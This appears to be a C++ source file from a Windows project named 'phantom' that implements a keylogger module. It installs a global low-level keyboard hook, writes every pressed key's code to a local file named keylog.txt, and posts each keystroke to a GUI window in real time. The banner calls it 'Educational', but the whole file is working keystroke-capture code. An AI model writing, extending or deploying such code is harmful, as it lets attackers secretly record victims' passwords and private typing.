#include "phantom/modules.h"
#include <iostream>
#include <windows.h>
#include <fstream>

namespace phantom::ui {
    extern HWND g_hwndMain;
}

namespace phantom::modules {
    HHOOK kbdHook = nullptr;
    
    LRESULT CALLBACK KbdHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0) {
            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
                KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
                
                // Notify GUI in real-time
                if (phantom::ui::g_hwndMain != nullptr) {
                    PostMessageW(phantom::ui::g_hwndMain, WM_USER + 102, kbdStruct->vkCode, 0);
                }
                
                std::ofstream out("keylog.txt", std::ios::app);
                if (out.is_open()) {
                    out << "[" << kbdStruct->vkCode << "]";
                    out.close();
                }
            }
        }
        return CallNextHookEx(kbdHook, nCode, wParam, lParam);
    }

    void run_keylogger() {
        std::cout << "\n=== Keylogger (Educational) ===\n";
        std::cout << "Starting keylogger. Keys are logged to 'keylog.txt'.\n";
        std::cout << "Press Ctrl+C to stop.\n";

        kbdHook = SetWindowsHookEx(WH_KEYBOARD_LL, KbdHookProc, GetModuleHandle(nullptr), 0);
        if (kbdHook == nullptr) {
            std::cerr << "Failed to install hook!\n";
            return;
        }

        MSG msg;
        while (GetMessage(&msg, nullptr, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        UnhookWindowsHookEx(kbdHook);
    }
}
